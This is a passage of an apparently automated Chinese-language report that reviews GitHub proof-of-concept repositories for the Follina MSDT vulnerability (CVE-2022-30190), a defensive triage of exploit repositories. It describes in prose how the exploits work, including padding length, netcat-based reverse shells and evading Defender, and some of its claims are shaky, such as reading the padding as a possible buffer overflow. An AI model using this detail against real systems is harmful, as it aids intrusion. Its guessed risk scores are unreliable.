**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190，又名'Follina'，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。当MSDT被调用应用程序（如Microsoft Word）使用URL协议调用时，就会触发此漏洞。攻击者可以制作包含恶意链接或嵌入恶意OLE对象的Office文档（例如.docx或.rtf）。当用户打开这些文档时，MSDT会尝试通过HTTP(S)协议从远程服务器下载并执行恶意代码，从而允许攻击者在受害者系统上执行任意代码。POC代码中的`FollinaExtractor.cs` 文件显示，它用于解析docx和rtf文件，提取包含 `Target="mhtml:` 或 `\objclass http` 的信息,进而判断文件是否包含恶意链接，其他文件则是创建WPF应用的相关文件，没有发现明显的恶意代码。

**有效性评估：**根据漏洞库信息和搜索结果，该漏洞是一个已公开且被积极利用的漏洞，提供的POC代码是用于检测受感染的docx或rtf文档中是否包含利用该漏洞的恶意链接，该POC代码的目的是提取恶意链接，而不是直接进行攻击，所以判断该POC代码具有一定的有效性，可以辅助安全研究人员分析恶意样本。

**投毒风险评估：**该POC代码主要功能是分析文档，提取潜在的恶意链接，因此投毒风险较低。但是,任何代码都可能存在隐藏的后门或者被篡改的风险，因此也不能完全排除。将风险评估为5%。

**利用方式：**
1.  攻击者创建一个恶意的Word文档（.docx）或RTF文档，该文档包含一个指向远程服务器的链接。
2.  当用户打开该文档时，Word会尝试通过MSDT URL协议连接到远程服务器。
3.  远程服务器返回恶意HTML代码或脚本，该代码会被MSDT执行，从而允许攻击者在受害者系统上执行任意代码。
4.  攻击者可以使用户的身份执行命令，从而控制受害者的计算机。

**项目地址:** [Nyx2022/Follina-CVE-2022-30190-Sample](https://github.com/Nyx2022/Follina-CVE-2022-30190-Sample)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #12

**来源**: [CVE-2022-30190-Potato-9257_CVE-2022-30190_page.md](../2022/CVE-2022-30190-Potato-9257_CVE-2022-30190_page.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，控制受害者计算机

**影响版本:** 受影响的Windows版本（见漏洞库信息）

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序，例如Microsoft Word

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过利用URL协议调用MSDT，从而在受害者系统上执行任意代码。利用方式通常是诱使用户打开包含恶意链接或文档的应用程序，比如Microsoft Word。该文档会利用Word的远程模板功能，从远程Web服务器检索HTML文件。该HTML文件包含JavaScript代码，用于使用ms-msdt协议处理恶意payload，该payload通过PCWDiagnostic触发代码执行。提供的POC代码使用ms-msdt协议，尝试执行计算器程序（calc.exe）。由于calc.exe在payload中，我判定仓库中不存在作者隐藏的投毒代码的概率为99%。投毒风险评估为极低。

**利用方式总结：**

1.  攻击者创建一个恶意Word文档（或其他支持远程模板的应用程序）。
2.  该文档包含一个指向恶意HTML文件的链接。
3.  用户打开该文档。
4.  Word从远程服务器下载并执行恶意HTML文件。
5.  HTML文件利用ms-msdt协议，触发MSDT执行任意代码，例如执行计算器程序。

**项目地址:** [Potato-9257/CVE-2022-30190_page](https://github.com/Potato-9257/CVE-2022-30190_page)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #13

**来源**: [CVE-2022-30190-RathoreAbhiii_Folina-Vulnerability-Exploitation-Detection-and-Mitigation.md](../2022/CVE-2022-30190-RathoreAbhiii_Folina-Vulnerability-Exploitation-Detection-and-Mitigation.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以利用此漏洞在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本包括但不限于 Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022 (请参考漏洞库信息中的详细版本)

**利用条件:** 需要用户打开恶意文档（例如Word文档）或点击恶意链接。调用应用程序（如Word）需要允许使用 URL 协议调用 MSDT。

**POC 可用性:** 是，虽然提供的代码只是一个README.md，但其他搜索结果表明有可用的PoC。

**投毒风险:** 20%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过构造恶意的Word文档，利用Word的远程模板功能从远程Web服务器检索HTML文件，最终通过MSDT执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞真实存在且影响广泛。虽然提供的POC代码（README.md）本身不包含任何漏洞利用代码，但是搜索引擎结果表明该漏洞存在公开的POC，因此可以判断该漏洞是可利用的。

**投毒风险：**
提供的代码仓库只包含一个README.md文件，文件内容是关于Follina漏洞的利用、检测和缓解的说明，没有发现任何恶意代码。因此，直接从这个仓库判断是否存在投毒代码的可能性较低。但是，由于攻击者通常会修改POC代码以达到自己的目的，因此用户在使用互联网上找到的任何POC代码时，都需要保持警惕并进行安全审查，才能防止被植入恶意代码。

**利用方式：**
1.  攻击者创建一个恶意的文档，例如 Word 文档。
2.  该文档利用 Word 的远程模板功能，从攻击者控制的服务器上下载 HTML 文件。
3.  HTML 文件包含特定的 JavaScript 代码，该代码通过 `ms-msdt:/` 协议调用 MSDT。
4.  MSDT 接收到精心构造的参数后，会在受害者的机器上执行攻击者预先设定的恶意代码，从而实现远程代码执行。

**修复方案：**
*   及时更新Windows操作系统到最新版本。
*   禁用MSDT URL协议处理程序 (作为临时缓解措施)。
*   在 Defender 中添加规则阻止相关攻击。

**项目地址:** [RathoreAbhiii/Folina-Vulnerability-Exploitation-Detection-and-Mitigation](https://github.com/RathoreAbhiii/Folina-Vulnerability-Exploitation-Detection-and-Mitigation)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #14

**来源**: [CVE-2022-30190-ToxicEnvelope_FOLLINA-CVE-2022-30190.md](../2022/CVE-2022-30190-ToxicEnvelope_FOLLINA-CVE-2022-30190.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码。

**影响版本:** 受影响的Windows版本和版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开恶意构造的文档，例如Word文档。攻击者需要诱骗用户执行恶意操作。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，也被称为Follina，是一个影响Microsoft Windows Support Diagnostic Tool (MSDT)的远程代码执行漏洞。攻击者可以利用此漏洞，通过诱使用户打开包含恶意URL的文档（例如，利用Word远程模板功能）来执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，该漏洞的POC代码是有效的。 搜索引擎结果中的多个链接（如hackthebox.com的解释、fortinet的分析以及qualys的博客等）证实了该漏洞的存在和可利用性。POC代码（`exploit.py`）提供了一种生成恶意Word文档，并通过HTTP服务器提供恶意HTML有效载荷的方法，从而利用MSDT执行任意命令。

**投毒风险：**

虽然POC代码的主要功能是生成漏洞利用程序，但存在一定的投毒风险。风险分析如下：

*   **依赖性：**  `exploit.py`脚本依赖于外部资源（HTTP服务器），如果攻击者控制了该服务器，则可以修改返回的HTML内容，从而在目标系统上执行恶意代码。 
*   **自定义命令执行：**  该脚本允许用户自定义要在目标系统上执行的命令 (`--command`参数)。攻击者可以通过精心构造的命令来执行恶意操作，例如下载和执行额外的恶意软件。
*  **Reverse Shell：** `--reverse` 参数会下载 netcat 到目标机器，虽然功能上为了利用，但也可能被滥用。
*   **代码可读性：**  虽然代码本身看起来没有明显的恶意后门，但是代码相对复杂，可能隐藏着一些不易察觉的恶意逻辑。

综合来看，虽然没有明显的投毒代码，但该工具的灵活性和对外部资源的依赖性使其存在一定的投毒风险，估计为10%。

**利用方式：**

1.  **攻击者准备恶意Word文档：**  攻击者使用`exploit.py`脚本生成一个包含恶意URL的Word文档。该URL指向攻击者控制的HTTP服务器。
2.  **攻击者搭建HTTP服务器：**  攻击者在自己的服务器上搭建一个HTTP服务器，用于托管恶意HTML有效载荷。
3.  **诱骗用户打开恶意文档：**  攻击者通过电子邮件、社交媒体或其他方式诱骗用户打开恶意Word文档。
4.  **MSDT被调用并执行恶意代码：**  当用户打开文档时，Word会尝试通过URL协议调用MSDT。MSDT会从攻击者的服务器下载恶意HTML，并执行其中的代码，从而实现远程代码执行。
5.  **攻击者控制目标系统：**  成功利用漏洞后，攻击者可以获得目标系统的控制权，并执行任意操作，例如安装恶意软件、窃取数据或创建新账户。

**项目地址:** [ToxicEnvelope/FOLLINA-CVE-2022-30190](https://github.com/ToxicEnvelope/FOLLINA-CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #15

**来源**: [CVE-2022-30190-Zitchev_go_follina.md](../2022/CVE-2022-30190-Zitchev_go_follina.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以利用此漏洞在受害者系统上执行任意代码，完全控制受害者系统。

**影响版本:** 受影响的版本包括Windows 7到Windows 11和Windows Server的多个版本，具体参见漏洞库信息。

**利用条件:** 需要用户打开恶意的Office文档（如Word）或访问包含恶意代码的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于Microsoft支持诊断工具（MSDT）中的远程代码执行漏洞。攻击者可以诱骗用户打开包含恶意链接或嵌入对象的Office文档（例如Word文档）。当用户打开恶意文档时，MSDT会尝试通过URL协议连接到攻击者控制的远程服务器。该服务器会提供一个包含恶意代码的HTML文件。这个HTML文件利用`ms-msdt:`协议触发MSDT执行任意代码。\n\n**利用方式分析：**\n
1.  **攻击者准备：** 攻击者需要搭建一个HTTP服务器，用于托管恶意payload。同时，攻击者需要创建一个恶意的Office文档，该文档包含一个指向攻击者服务器上HTML payload的链接。
2.  **诱骗受害者：** 攻击者通过电子邮件、社交媒体或其他方式将恶意Office文档发送给受害者。\n3.  **漏洞触发：** 受害者打开恶意Office文档。Word会尝试通过URL协议访问攻击者服务器上的HTML payload。\n4.  **代码执行：** HTML payload利用`ms-msdt:`协议，导致MSDT执行攻击者指定的命令。攻击者可以利用此漏洞安装恶意软件、窃取数据、创建新账户等。\n\n**代码分析：**\n
提供的Go代码是一个PoC，用于生成利用该漏洞的恶意docx文件。其主要步骤如下：

1.  `createMaliciousDocx` 函数：读取模板文件 `template/document.xml.rels.template`，将占位符 `{staged_html}` 替换为 payload 的 URL，然后将其写入 `template/doc/word/_rels/document.xml.rels`。接着调用 `zipDoc` 函数，将 `template/doc/` 目录下的所有文件打包成一个恶意的 docx 文件（tmp/file.docx）。
2.  `zipDoc` 函数：创建一个zip文件 (tmp/file.docx)，然后调用 `addFilesToArchive` 函数将 `template/doc/` 目录下的所有文件添加到该zip文件中。
3.  `addFilesToArchive` 函数：递归地将指定目录下的所有文件添加到zip文件中。
4.  `createPayload` 函数：生成包含恶意 ms-msdt 协议调用的 HTML payload。这个 payload 会使用 PowerShell 下载并执行攻击者指定的反向shell程序。
5.  `hostDropper` 函数：启动一个HTTP服务器，用于托管 payload.html 和反向shell程序 (poop.exe)。

**投毒风险分析：**\n
PoC 代码主要用于生成恶意的 docx 文件，核心在于生成包含恶意 `ms-msdt` 协议调用的 `payload.html` 文件。仔细检查代码，没有发现明显的恶意后门，但是存在以下几点潜在风险：

1.  **反向 Shell：**  代码中使用反向 shell。如果攻击者使用 PoC 生成恶意文件，他们可以完全控制受害者的计算机。PoC 本身不是后门，但容易被滥用。`revshellpath` 参数允许攻击者指定任意可执行文件，这为植入恶意软件提供了机会。
2.  **依赖性：** 此 PoC 依赖于模板文件 `template/document.xml.rels.template` 和指定的反向 shell 程序。如果这些文件被篡改，PoC 的行为可能会发生变化。在实际应用中，攻击者可以修改模板文件，例如嵌入其他的恶意代码。
3. **随机字符串生成器:** 代码中使用随机字符串来填充html，增加分析难度，也可能存在一定的随机性风险。

总体来说，此 PoC 存在一定的投毒风险，主要是由于反向 shell 的使用，以及对外部文件的依赖。但代码本身并不包含明显的恶意后门。 风险概率估计为 10%， 主要来自第三方恶意软件捆绑或者程序被篡改。

**项目地址:** [Zitchev/go_follina](https://github.com/Zitchev/go_follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #16

**来源**: [CVE-2022-30190-alien-keric_CVE-2022-30190.md](../2022/CVE-2022-30190-alien-keric_CVE-2022-30190.md)

## CVE-2022-30190 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，权限提升，数据泄露

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户需要打开恶意文档（例如Word），或者点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。该漏洞的利用方式如下：

1.  **攻击媒介：** 攻击者可以创建一个恶意的Microsoft Office文档（如Word），或者通过其他方式诱使用户点击一个特制的URL链接。
2.  **漏洞触发：** 当用户打开恶意文档或点击恶意链接时，MSDT会通过`ms-msdt:` URL协议被调用。
3.  **远程模板注入：** 恶意文档利用Word的远程模板功能，从远程服务器检索HTML文件。该HTML文件中包含恶意的JavaScript代码。
4.  **代码执行：** 嵌入在HTML中的JavaScript代码构造一个MSDT协议URL，该URL利用`PCWDiagnostic`参数来执行任意命令。
5.  **有效性：** 提供的Python脚本 `payload.py` 用于生成包含恶意命令的HTML payload。脚本首先将要执行的命令进行Base64编码，然后将其嵌入到一个特制的HTML脚本中，该脚本利用了`ms-msdt:` 协议。该POC代码看起来是有效的，可以生成利用此漏洞的payload。
6.  **投毒风险：** 提供的POC仓库主要包含生成Payload的脚本，脚本目的是使用Invoke-Expression执行base64编码的命令,虽然脚本本身没有明显的恶意代码，但存在以下投毒风险：
    * 依赖风险：Payload生成脚本依赖base64编码技术，攻击者有可能通过修改解码后的命令来实现恶意行为。
    * 载荷风险：Payload最终会执行PowerShell命令，这为执行恶意载荷提供了机会。攻击者可以嵌入各种恶意代码，如反向Shell、文件下载执行等。
    * 脚本来源风险： 虽然脚本声称来源于JohnHammond的GitHub仓库，但是有被篡改的风险，需要人工审核确认。
    因此，综合评估，该仓库中存在一定投毒风险, 估计占比10%。主要风险集中在使用者在使用payload时可能引入恶意代码。
7.  **缓解措施：**
    *   禁用MSDT URL协议。
    *   安装Microsoft提供的安全更新。
    *   使用威胁检测工具来识别和阻止利用此漏洞的攻击。

总体而言，CVE-2022-30190是一个严重的安全漏洞，攻击者可以利用它在受影响的系统上执行任意代码。用户应尽快采取措施来缓解此漏洞带来的风险。

**项目地址:** [alien-keric/CVE-2022-30190](https://github.com/alien-keric/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #17

**来源**: [CVE-2022-30190-aminetitrofine_CVE-2022-30190.md](../2022/CVE-2022-30190-aminetitrofine_CVE-2022-30190.md)

## CVE-2022-30190 (Follina) - Microsoft MSDT远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，获取系统控制权

**影响版本:** 受影响的Windows版本包括但不限于Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022，具体版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开包含恶意代码的Word文档或其他调用MSDT的应用程序。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个Microsoft MSDT远程代码执行漏洞。攻击者可以利用Word等应用程序通过URL协议调用MSDT来执行任意代码。漏洞利用过程大致如下：

1.  攻击者创建一个包含恶意链接的Word文档或其他支持URL协议调用MSDT的文档。
2.  当受害者打开该文档时，Word会尝试通过URL协议调用MSDT。
3.  恶意URL指向攻击者控制的服务器，服务器返回包含恶意代码的HTML页面。
4.  MSDT执行HTML页面中的恶意代码，从而实现远程代码执行。

根据提供的漏洞利用代码`follina.py`，该脚本可以生成包含恶意引用的Word文档，指向攻击者控制的HTTP服务器。HTTP服务器提供包含恶意代码的HTML文件，当受害者打开Word文档时，MSDT将执行此代码。

**有效性：** 提供的POC代码 `follina.py` 看起来有效，可以生成包含恶意代码的Word文档，并通过HTTP服务器提供payload。通过命令行参数可以指定要执行的命令（例如calc.exe或notepad.exe），或者获取反向shell。

**投毒风险：** `follina.py` 代码本身主要功能是利用漏洞，生成包含恶意代码的文档和提供payload。但值得注意的是，如果使用反向shell功能（`-r` 参数），代码会尝试从GitHub下载 `nc64.exe` (Netcat) 并将其放置在受害者系统的 `C:\Windows\Tasks` 目录下。这本身不是投毒行为，而是exploit的一部分，目的是为了建立反向连接。 但从Github下载的netcat二进制文件来源是否安全需要考虑，存在一定的供应链风险。仓库中的README.md文件描述中使用的下载链接也需要验证安全性。

综合考虑，认为该仓库存在一定程度的投毒风险，但主要来自于供应链风险和exploit本身行为引入的风险，而非作者恶意植入的后门，因此投毒风险评估为10%。

**利用方式：**

1.  **生成恶意文档：** 使用 `follina.py` 脚本生成包含恶意链接的Word文档（或其他支持的文档）。
2.  **搭建HTTP服务器：** 运行 `follina.py` 脚本会启动一个HTTP服务器，用于提供恶意HTML payload。
3.  **诱骗受害者打开文档：** 通过电子邮件、社交媒体或其他方式将恶意文档发送给受害者，诱骗其打开。
4.  **执行任意代码：** 受害者打开文档后，MSDT会执行HTTP服务器提供的恶意代码，从而实现远程代码执行。攻击者可以执行任意命令，安装恶意软件，窃取数据等。

**项目地址:** [aminetitrofine/CVE-2022-30190](https://github.com/aminetitrofine/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #18

**来源**: [CVE-2022-30190-ar2o3_FollinaXploit.md](../2022/CVE-2022-30190-ar2o3_FollinaXploit.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，系统被完全控制

**影响版本:** 受影响的Windows版本范围广泛，包括Windows 7至Windows 11及多个Server版本，详见漏洞库信息。

**利用条件:** 用户需要打开包含恶意链接或文档（如Word文档）的应用程序。攻击依赖于MSDT通过URL协议被调用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过精心构造的恶意文档，诱使用户打开，该文档利用Word的远程模板功能从远程服务器检索HTML文件，通过MSDT协议执行任意代码。该漏洞的利用方式是：

1.  **攻击者创建一个恶意的Word文档或其他支持远程模板的文档。**
2.  **该文档包含一个指向恶意服务器的链接，用于下载一个HTML文件。**
3.  **当用户打开该文档时，Word会尝试从远程服务器下载HTML文件。**
4.  **HTML文件包含恶意的JavaScript代码，该代码使用`ms-msdt:`协议调用MSDT，并执行任意命令。**
5.  **攻击者利用MSDT的漏洞执行系统命令，实现远程代码执行。**

**有效性评估：**
根据漏洞库信息和搜索结果，此漏洞利用的有效性较高，已被积极利用。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议的许可证，属于开源协议声明，不具备实际的漏洞利用代码。无法直接用于评估是否存在后门或恶意代码。但考虑到实际漏洞利用中可能存在复杂的攻击链，且攻击者可能修改或添加额外的恶意代码，仍然存在一定的投毒风险。此处预估投毒风险为10%，主要考虑实际利用中攻击者可能的定制行为。

**搜索引擎结果补充：** 搜索引擎结果中提到漏洞利用需要调用URL协议和MSDT。同时，参考 Qualys 的博客，表明此漏洞影响范围广泛。Arctic Wolf的博客也指出此漏洞已经被积极利用。这些都增加了漏洞利用的有效性评估。


**项目地址:** [ar2o3/FollinaXploit](https://github.com/ar2o3/FollinaXploit)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #19

**来源**: [CVE-2022-30190-arozx_CVE-2022-30190.md](../2022/CVE-2022-30190-arozx_CVE-2022-30190.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 见漏洞库信息中的受影响版本列表

**利用条件:** 用户需要打开恶意Word文档或点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190 (Follina) 是一个 Microsoft Office 漏洞，当从 Word 等调用应用程序中使用 URL 协议调用 MSDT 时，存在远程代码执行漏洞。攻击者可以利用此漏洞在受害者系统上执行任意代码。根据提供的PoC代码，攻击方式主要通过构造恶意的HTML文件（exploit.html），该文件包含大量的 'A' 字符，可能用于缓冲区溢出或其他内存破坏技术，从而执行恶意代码。该HTML文件需要通过Word的远程模板功能从远程服务器检索。server.py脚本可能用于托管该恶意HTML文件。漏洞利用有效性较高，因为该漏洞已被公开利用并添加到 CISA KEV 目录。投毒风险评估为10%。因为攻击者可能通过服务器端植入后门，但是该后门不是通过PoC直接表现，需要攻击者自身行为才能形成。 

**利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意HTML的Word文档。
2.  当用户打开该文档时，Word会尝试通过MSDT URL协议加载远程HTML文件。
3.  恶意HTML文件利用MSDT漏洞执行任意代码，例如下载并执行恶意程序，或直接在受害者系统上执行命令。

**项目地址:** [arozx/CVE-2022-30190](https://github.com/arozx/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #20

**来源**: [CVE-2022-30190-drgreenthumb93_CVE-2022-30190-follina.md](../2022/CVE-2022-30190-drgreenthumb93_CVE-2022-30190-follina.md)

## CVE-2022-30190-Follina

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许远程代码执行，可完全控制受害者系统

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序（如Word），需要用户交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过诱使用户打开恶意构造的Word文档或其他支持URL协议的应用程序来利用此漏洞。该文档会利用Word的远程模板功能从远程Web服务器检索HTML文件，HTML文件中包含恶意的JavaScript代码。该JavaScript代码使用`ms-msdt:` URL协议调用MSDT，并传递恶意的命令参数，导致MSDT执行任意代码。PoC代码通过修改`word\rels\document.xml.rels`文件中的目标IP来指定恶意HTML文件的位置。`bad.html`文件包含大量的填充字符，之后是恶意JavaScript代码。攻击者需要确保在`window.location.href`之前至少有3541个字符，并且这些字符必须在`<script>`标签内。PoC的README提到Windows Defender可能会检测到此漏洞（Trojan:Win32/Mesdetty.D），因此可能需要编辑PoC文件以绕过检测。根据提供的代码和信息，没有发现作者有意添加的投毒代码。

**项目地址:** [drgreenthumb93/CVE-2022-30190-follina](https://github.com/drgreenthumb93/CVE-2022-30190-follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #21

**来源**: [CVE-2022-30190-ethicalblue_Follina-CVE-2022-30190-Sample.md](../2022/CVE-2022-30190-ethicalblue_Follina-CVE-2022-30190-Sample.md)

## CVE-2022-30190 - Microsoft MSDT "Follina" RCE

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的多个Windows版本，详见漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文件的应用程序（例如Word）。攻击通常通过诱骗用户打开恶意文档触发。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190，又名"Follina"，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。该漏洞允许攻击者通过MSDT URL协议，从调用应用程序（如Microsoft Word）执行任意代码。攻击者通常会制作恶意的Word文档或RTF文件，其中包含指向恶意HTML文件的链接。当用户打开文档时，Word会通过MSDT协议加载HTML文件，从而导致恶意代码执行。

**漏洞利用方式：**

1.  **诱骗用户打开恶意文档：** 攻击者通过电子邮件、网络钓鱼或其他方式，诱骗用户打开特制的Word文档或RTF文件。
2.  **文档包含恶意链接：** 该文档包含一个指向远程服务器上托管的恶意HTML文件的链接，通常使用`ms-msdt:/`协议触发。
3.  **利用MSDT执行代码：** 当Word尝试打开链接时，会调用MSDT，并执行HTML文件中嵌入的恶意代码，最终实现远程代码执行。

**POC分析：**

提供的POC代码包含以下文件：

*   `App.xaml` 和 `App.xaml.cs`: 定义WPF应用程序的入口点和资源。
*   `AssemblyInfo.cs`: 包含程序集的元数据，例如主题信息。
*   `FollinaExtractor.cs`:  包含用于从受感染的Word文档（.docx）或RTF文件中提取恶意链接的代码。它解析`word/_rels/document.xml.rels`文件以查找`Target="mhtml:`开头的字符串，或RTF文件寻找恶意链接，从而提取恶意MHTML链接。
*   `Follina_PoC.csproj`:  定义项目设置，例如目标框架和使用的WPF。

此POC代码用于分析和提取Follina漏洞相关的恶意URL，不包含直接执行恶意代码的部分，是一个分析工具。

**投毒风险评估：**

此仓库的主要功能是提取已知的漏洞利用代码。通过检查`FollinaExtractor.cs`，我们可以确定它主要用于读取文件内容并搜索特定的字符串模式。因此，该仓库的作者可以通过隐藏在不太明显的地方的代码（例如，通过引入额外的库或修改现有的解析逻辑），在提取过程中执行一些额外的操作（例如，记录提取的URL，收集系统信息等）。但是，由于其主要功能是分析文件，因此恶意代码的插入点有限。投毒风险较低。
基于漏洞利用代码的分析，我们认为该仓库存在投毒风险的可能性为5%。大部分代码都是标准WPF应用程序结构和字符串解析功能。

**项目地址:** [ethicalblue/Follina-CVE-2022-30190-Sample](https://github.com/ethicalblue/Follina-CVE-2022-30190-Sample)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #22

**来源**: [CVE-2022-30190-hycheng15_CVE-2022-30190.md](../2022/CVE-2022-30190-hycheng15_CVE-2022-30190.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本包括Windows 7 SP1到Windows 11 21H2，具体版本范围见漏洞库信息。

**利用条件:** 用户需要打开恶意的Word文档。攻击者需要能够托管一个HTTP服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞 (CVE-2022-30190)，又名Follina，是由于MSDT处理URL协议不当造成的远程代码执行漏洞。攻击者可以构造一个恶意的Word文档，其中包含指向远程HTTP服务器的链接。当用户打开文档时，Word会使用MSDT通过URL协议去请求远程HTML文件。这个HTML文件包含恶意的JavaScript代码，用于执行任意命令。

**有效性：** 提供的POC代码是有效的。该代码通过以下步骤利用漏洞：

1.  创建一个恶意的Word文档，其中包含指向攻击者控制的HTTP服务器的链接。
2.  托管一个HTTP服务器，该服务器提供包含恶意JavaScript代码的HTML文件。
3.  当受害者打开Word文档时，MSDT会尝试连接到攻击者的服务器并执行恶意代码。

**投毒风险：** 存在一定的投毒风险 (10%)。

*   `folina.py`脚本本身看起来是合法的漏洞利用代码，但需要仔细检查其依赖项和网络行为。
*   虽然主要功能集中在生成漏洞利用文件和搭建HTTP服务，但仍需审查脚本中是否存在任何潜在的恶意行为，例如未记录的数据传输或额外的文件操作。
*  脚本中从github下载`nc64.exe`，如果github上的文件被替换为恶意程序，则存在被投毒风险。

**利用方式：**

1.  攻击者创建一个恶意的Word文档 (`follina.doc`)，其中包含指向远程服务器上托管的HTML文件的链接。
2.  攻击者搭建一个HTTP服务器，托管包含恶意JavaScript代码的HTML文件 (`index.html`)。这个HTML文件使用`ms-msdt:`协议触发MSDT，并执行payload。
3.  攻击者诱骗受害者打开恶意的Word文档。
4.  Word文档加载远程HTML文件，触发MSDT，从而在受害者系统上执行任意代码。

POC代码使用python编写，主要步骤如下：

*   **环境准备:**
    *   搭建Windows虚拟机(推荐Win10 21H2)，并安装Microsoft Word 2013及Python 3.8.10。
    *   关闭Windows的病毒和威胁防护。
